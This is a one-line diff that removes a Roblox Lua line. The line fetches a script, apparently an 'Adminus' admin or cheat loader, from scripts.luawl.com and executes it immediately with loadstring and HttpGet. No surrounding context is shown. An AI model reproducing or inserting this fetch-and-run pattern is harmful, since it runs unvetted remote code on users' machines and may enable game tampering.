@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://scripts.luawl.com/16001/AdminusFreeVersion.lua'))()
